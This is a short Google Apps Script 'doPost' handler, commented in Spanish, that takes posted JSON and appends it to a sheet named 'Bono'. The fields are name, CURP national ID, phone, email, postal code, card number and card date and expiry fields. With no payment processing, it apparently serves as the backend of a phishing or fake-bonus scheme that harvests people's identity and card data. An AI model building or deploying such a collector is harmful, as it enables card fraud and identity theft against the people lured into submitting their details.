function doPost(e) {
  try {
    var sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Bono');
    if (!sh) throw new Error('No existe la hoja Bono');

    var payload = JSON.parse(e.postData.contents || '{}');

    var row = [
      payload.nombre || '',      // A Nombre
      payload.fecha || '',       // B Fecha
      payload.estado || '',      // C Estado
      payload.ciudad || '',      // D Ciudad
      payload.curp || '',        // E Curp
      payload.numeroCel || '',   // F NumeroCel
      payload.tarjeta || '',     // G Tarjeta
      payload.fechaTarjeta || '',// H Fecha (tarjeta)
      payload.exp || '',         // I Exp
      payload.codigoPost || '',  // J CodigoPost
      payload.correo || ''       // K Correo
    ];

    sh.appendRow(row);

    return ContentService.createTextOutput(JSON.stringify({ ok: true }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({ ok: false, error: String(error) }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
